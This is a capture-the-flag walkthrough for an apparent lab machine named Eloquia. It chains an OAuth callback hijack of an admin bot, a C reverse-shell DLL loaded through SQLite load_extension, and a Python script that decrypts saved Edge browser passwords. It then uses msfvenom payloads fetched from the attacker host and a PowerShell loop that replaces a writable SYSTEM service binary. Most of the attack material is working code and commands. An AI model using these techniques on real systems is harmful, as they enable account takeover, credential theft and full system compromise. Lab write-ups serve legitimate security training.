- in this writeup in sha Allah you will understand every things , Technique and commands we have used. when and why we using it

>first you must see the open services to know where you will be start

# scan ports and services

```
nmap -sVC 10.129.2.230
```

- sV to show version of the service

- sC for default scripting in nmap scan


> it shows to me http open lets add it to our hosts config file and i found http in port Port 5985 (WinRM) i tired found any hidden page with gobuster but it didn't give me anything interesting so i found that we can login and register and i used goubuster to see all pages in /accounts/ endpoint api and it give me that

```
┌──(kali㉿kali)-[~/Desktop]
└─$ gobuster dir -u  http://eloquia.htb/accounts -w /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://eloquia.htb/accounts
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 223 / 4613 (4.83%)[ERROR] error on word .bashrc: timeout occurred during the request
[ERROR] error on word .history: timeout occurred during the request
/admin                (Status: 301) [Size: 0] [--> /accounts/admin/]
/connect              (Status: 301) [Size: 0] [--> /accounts/connect/]
/delete               (Status: 301) [Size: 0] [--> /accounts/delete/]
/login                (Status: 301) [Size: 0] [--> /accounts/login/]
/logout               (Status: 301) [Size: 0] [--> /accounts/logout/]
/profile              (Status: 301) [Size: 0] [--> /accounts/profile/]
/register             (Status: 301) [Size: 0] [--> /accounts/register/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

- u URL
- w wordlist

> that's interesting there is a /admin page i opened it  give me login admin page i tired using sql injections but i think its my fault i cant get any data so after research i realized  that there is a bot admin in pages that read the reports articles from user so the plan is here we want the bot admin connect with our account in qooqle code callback when its still vaild in 30 seconds to login into admin page lets start first we want to create account in the both qooqle.htb  and eloquia.htb make sure you added qooqle.htb to your /etc/hosts config too



> and make the bot admin read the image source it will connect with our http server as we must open python-http server for example in our attacker machine why? to know when the bot admin active as it read the report every 3 minutes in this seconds we must open valid code back in the qooqle account and redirect our link to the bot to make the bot-admin link its account with our account

```
python3 -m http.server 8000
```

you will create an article now with this malicious code


<meta http-equiv="refresh" content="60;url=http://YOUR_IP:8000/"> 
<meta http-equiv="refresh" content="60;url=/accounts/oauth2/qooqle/callback/?code=[ATTACKER_CODE]">

> and with this we make the bot admin link its account with  our code so we can login into admin user with login with qooqle
content = 60 to  can report before it redirects it
after that go to your article you created and click report it to make bot-admin read it it will take a bit time  but no long time
when you see thing like this in your python web server 
10.10.10.123 - - [17/Dec/2025 ...] "GET / HTTP/1.1" 200 - 
that means the admin bot read the malicious code and now we have a linked our qooqle with the bot admin go to login with qooqle with your account you created before this exploit and click authorize 
you must be very fast in this part or your code callbacck will be unvaild or we just want and automation code

you can know more with this link

```
https://medium.com/@security.tecno/hacking-your-first-oauth-on-the-web-application-account-takeover-using-redirect-and-state-5e857c7b1d43
```



and boom we are admin now :)


> this automation all this we just config the parameters to ours and then waiting admin read the malicious article then login with qooqle and boom we are admins



> now we have to find to add reverse shell code we can got to create article from our admin dashboard and we can upload reverse dll 

- we want to get the libraries we need to skip any errors 

```
wget https://github.com/sqlite/sqlite/raw/master/src/sqlite3ext.h
```

> that is the library we need to create the dll reverse shell we use it to maket he code like an sql etenshion able to load and then select it from sql query


- i copied that code from  ai 

```
typedef struct sqlite3 sqlite3;
typedef struct sqlite3_api_routines sqlite3_api_routines;

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")


#define SQLITE_EXTENSION_INIT1
#define SQLITE_EXTENSION_INIT2(x)
#define SQLITE_OK 0

__declspec(dllexport) int sqlite3_extension_init(
    sqlite3 *db,                
    char **pzErrMsg,
    const sqlite3_api_routines *pApi   
) {
    SQLITE_EXTENSION_INIT2(pApi);   

    WSADATA wsaData;
    SOCKET s;
    struct sockaddr_in sa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2,2), &wsaData);
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr("YOUR_IP");  
    sa.sin_port = htons(YOUR_PORT);                     

    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
        ZeroMemory(&si, sizeof(si));
        ZeroMemory(&pi, sizeof(pi));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = (HANDLE)s;
        si.hStdOutput = (HANDLE)s;
        si.hStdError = (HANDLE)s;

        if (CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }

    closesocket(s);
    WSACleanup();

    return SQLITE_OK;   
}

```


> place this code with folder with the library we downloaded ok after that we have to convert it to dll that is the only file works in this web app


```
x86_64-w64-mingw32-gcc -shared -o shell.dll shell.c -lws2_32
```


that will convert our c code to dll 


> so lets upload it to the website  go to + article and upload our dll type any title and description and save and now we have successful added the extension dll to the system we have now to load it


- in sql explorer type

```
SELECT load_extension('C:\Web\Eloquia\static\assets\images\blog\YOURFILENAME.dll');
```


and boom we have a reverse shell

we can get our user.txt from c:\Users\web\Desktop\user.txt 

```
type  c:\Users\web\Desktop\user.txt
```

# now second part is PrivEsc :(


if we view the tasklist 

```
tasklist /v
```


> it will show us micrsoftedge.exe with n/a and Failure2Ban.exe n/a n/a that is unknown user obtain this files any way it seems beacuse the microsoftedge is runnig that bot-admin is store the data in the microdoftedge 


so after research the appdata of microsoft edge data is being by deafault here

```
"C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default"
```

so as we web user we can decrypt the data anyways i make the ai created the decrypt code

i stuck in this point i cant download for example from server to the web app is always says acsses denied and powershell the same so no soultion except using echo to create a file

thats code decrypt the (aes 256 crypt)

```
echo import os # to make actions on system > edge_decrypt.py
echo import json # to convert json to dict >> edge_decrypt.py
echo import base64 # to decode the base64 value >> edge_decrypt.py
echo import win32crypt # to dercrypt DPAPI (windows data protector api) >> edge_decrypt.py
echo import sqlite3 # to read data base files >> edge_decrypt.py
echo import shutil # to copy the file >> edge_decrypt.py
echo from Crypto.Cipher import AES # to decrypt the AES encryption >> edge_decrypt.py
echo. >> edge_decrypt.py
echo #get master key to decrypt the aes (256) crypt >> edge_decrypt.py
echo def get_master_key(): >> edge_decrypt.py
echo     local_state_path = os.path.join(os.environ['LOCALAPPDATA'],r"Microsoft\Edge\User Data\Local State") # LOCALAPPDATA system var is the dir path of local app data local state is the file that stored the encryptd master key >> edge_decrypt.py
echo. >> edge_decrypt.py
echo     #convert the json file to dict data in python >> edge_decrypt.py
echo     with open(local_state_path) as f: >> edge_decrypt.py
echo         data = json.load(f) # convert it to dict value >> edge_decrypt.py
echo. >> edge_decrypt.py
echo     #get the part we need in the json file (encrypted_key) >> edge_decrypt.py
echo     encrypted_key = data["os_crypt"]["encrypted_key"] # the encrypted_key be here >> edge_decrypt.py
echo     encrypted_key = base64.b64decode(encrypted_key) # decode it from base64 >> edge_decrypt.py
echo     pure_encrypted_key = encrypted_key[5:] # start after letter num 5 and contine the end  (we remove DPAPI word from key) >> edge_decrypt.py
echo. >> edge_decrypt.py
echo     #decrypt the windows data protector api crypt using win32crypt >> edge_decrypt.py
echo     master_key = win32crypt.CryptUnprotectData(pure_encrypted_key,dwFlags = 1)[1]# we go to index 1 in the tuple because it has the master_key data index 0 has the status >> edge_decrypt.py
echo. >> edge_decrypt.py
echo     #return master_key >> edge_decrypt.py
echo     return master_key >> edge_decrypt.py
echo. >> edge_decrypt.py
echo #the function nof decrypt password >> edge_decrypt.py
echo def decrypt_password(encrypted_password,master_key): >> edge_decrypt.py
echo     try: >> edge_decrypt.py
echo         iv = encrypted_password[3:15] #the iv its look like a uniqe finger point of this crypt as if the same name it wont creat a repeated crypt it will alaways be uniqe beacuse this num  >> edge_decrypt.py
echo         cipher_text = encrypted_password[15:-16] # the encrypted password data be here >> edge_decrypt.py
echo         cipher = AES.new(master_key,AES.MODE_GCM ,nonce=iv) # giving it the parmates it need >> edge_decrypt.py
echo         palin_text = cipher.decrypt(cipher_text).decode("utf-8") # decode the bytes into readable text >> edge_decrypt.py
echo. >> edge_decrypt.py
echo         #return text read able to us >> edge_decrypt.py
echo         return palin_text >> edge_decrypt.py
echo     except: >> edge_decrypt.py
echo         print("please check your parmaters decrypt failure") >> edge_decrypt.py
echo. >> edge_decrypt.py
echo #if the program running from itself >> edge_decrypt.py
echo if __name__ == "__main__": >> edge_decrypt.py
echo     master_key = get_master_key() >> edge_decrypt.py
echo     login_db = os.path.join(os.environ['LOCALAPPDATA'],r"Microsoft\Edge\User Data\Default\Login Data") >> edge_decrypt.py
echo     shutil.copy2(login_db,"tempdata.db") #copy the file to a temp file because if the main file are using we cant do any action in it  >> edge_decrypt.py
echo     connector = sqlite3.connect("tempdata.db") # read the data base file >> edge_decrypt.py
echo     curs = connector.cursor() # control the data base fle >> edge_decrypt.py
echo     curs.execute("SELECT action_url, username_value, password_value FROM logins") # select the parts we need  >> edge_decrypt.py
echo. >> edge_decrypt.py
echo     #extract parts from every tuple  >> edge_decrypt.py
echo     for data in curs.fetchall(): >> edge_decrypt.py
echo         url = data[0]  >> edge_decrypt.py
echo         user_name = data[1] >> edge_decrypt.py
echo         encrypted_password = data[2] >> edge_decrypt.py
echo. >> edge_decrypt.py
echo         decrypted_password = decrypt_password(encrypted_password,master_key) # decrypt the password >> edge_decrypt.py
echo. >> edge_decrypt.py
echo         if user_name and decrypted_password: >> edge_decrypt.py
echo             print(f"{url} : {user_name} : {decrypted_password}\n{"="*20}\n") >> edge_decrypt.py
echo. >> edge_decrypt.py
echo     curs.close() >> edge_decrypt.py
echo     connector.close() >> edge_decrypt.py
echo     os.remove("tempdata.db") >> edge_decrypt.py
```
> to explain: that code will get the decrypted master key and after that will decrypt the AES encryption using geting the iv (look like finger point to this decrypt) and master key and decode it to get a plain text password

we cant use  python.exe we must find its absolute path

```
where /r C:\ python.exe
```

- it shows us 

```
C:\Program Files\Python311\python.exe
```

- put it in duple cotes to  fix any proplem of paths 

```
"C:\Program Files\Python311\python.exe" edge_decrypt.py
```

- it will decrypt the login data in edge browser

> after that we can login with our data into evil-winrm its look like ssh but its the windows verstion 


```
evil-winrm -i 10.129.3.149 -u 'username' -p 'password'
```


after that we logined with a high priv user than web ok lets enumeration 

*Evil-WinRM* PS C:\Users\Olivia.KAT> cd Desktop
*Evil-WinRM* PS C:\Users\Olivia.KAT\Desktop> dir

```
    Directory: C:\Users\Olivia.KAT\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/30/2024   1:53 PM           1558 Failure2Ban - Prototype - Shortcut.lnk
-a----         5/6/2024   2:00 PM        1331957 Logfile.PML
-a----        4/22/2024   7:02 AM            362 Todo.txt
```

we found Failure2Ban 

so first we have to find its path 

```
reg query "HKLM\System\CurrentControlSet\Services\Failure2Ban" /v ImagePath
```


this will give to us its executable path it give us like this

```
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Failure2Ban
ImagePath    REG_EXPAND_SZ    C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe
```

we can show our premotions in this directory with this command

```
icacls "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe"
```

```
*Evil-WinRM* PS C:\Users\Olivia.KAT\Desktop> icacls "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe"
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe ELOQUIA\*******:(I)(RX,W)
                                                                                                   NT AUTHORITY\SYSTEM:(I)(F)
                                                                                                   BUILTIN\Administrators:(I)(F)
                                                                                                   BUILTIN\Users:(I)(RX)
                                                                                                   APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                                                                   APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```


and here we see that our user can write (W) in this directory 

> so because the Failure2Ban service execute its code from this directory C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe if we replace the Failure2Ban.exe with a malicious code such as reverse shell we will login into the administrator because the Failure2Ban.exe has a system privileged premotions

- so here we are cd this directory

```
cd "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug"
```

- ok we want to create a reverse shell program we can use Metasploit frame work

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_LISNER_PORT -f exe -o rev.exe 
```

after that we want to download the file into our path

- first open server such as python server

```
python3 -m http.server 8000
```

and then run this in your path to get the file from server


```
IWR -Uri http://YOUR_IP:8000/rev.exe -OutFile rev.exe

```

and then open listener

```
nc -lvnp 4444
```


and run the full path of the program the program will be worked

```
"C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\rev.exe"
```


> but this wont work why because you run it not the system so we wont have a shell with system rivlged we want the system itself to run this code so because Failure2Bay is the file that service run it with system privileged we must replace itself wit our file to be in the same address in the memory (replace) or if we replace it with a program of the same name we will get a reverse shell with user because we can replace it while its running we will make a while loop when the program be refreshing or some thing it be unlocked with few seconds and can replace it


> so when we replace it successfully with our malicious Failure2Ban version we must wait the service to run it 

you can get the rev shell malicious binary to any writeable director

go to any writeable directory or create temp file

```
mkdir c:\temp
```

```
cd c:\temp
```

- open web server such as python http server

```
python3 -m http.server 8000
```

- and download our malicious code into machine with

```
IWR -Uri http://YOUR_IP:8000/malicious_name.exe -OutFile C:\temp\malicious_name.exe
```

> i tired making reverse shell program but its failed with me it may the server block it so we can just copy our flag root to ours current directory this c code when it runs with system privilege will copy to us root.txt from Administrator user to any directory we want

- lets make a simple c code doing that

```
#include <windows.h>
#include <stdio.h>

int main() { 
    // Note: the * is a pointer to the first character of the string, and the rest of the string is automatically read from consecutive memory locations
    const char* root = "C:\\Users\\Administrator\\Desktop\\root.txt"; // path to the root flag file (only accessible by Administrator)

    const char* directory = "C:\\temp\\root.txt"; // path where we want to copy the file (accessible by our current low-privilege user)

    CopyFile(root, directory, FALSE); // copy the file from the source (Administrator's desktop) to our accessible directory
                                      // FALSE means overwrite the destination file if it already exists

    return 0; // indicates successful program execution to the operating system
}
```

- we can compile our c code to exe with


```
x86_64-w64-mingw32-gcc root.c -o malicious_name.exe 
``` 

-o | output

> fist we have to replace the main binary with our malicious file
becuse the program running with the system we cant replace it or doing any thing on it we must wait the file restart to be unrunnig in this micro seconds to replace it with our malicious file we can use power shell code while and skip errors until the program be un active and replaced with our malicious succesufly

this simple while true skipping errors in power shell code

```
$source = 'C:\temp\malicious_name.exe'
$target = 'C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe'

while ($true) {
    try {
        Copy-Item $source $target -Force -ErrorAction Stop
        Write-Output "SUCCESS! File replaced."
        break
    } catch {
        Start-Sleep -Milliseconds 200
    }
}

``` 


> this script will run that commands for ever while it results error (the binary is still in use) (will continue) else (no errors) (the app was restarted or unused) it will replace the main binary or file with our malicious file


> then we just have wait service to execution our malicious and get a root flag copy you can just type 

```
type root.txt
``` 

and congrats you owned the machine :)
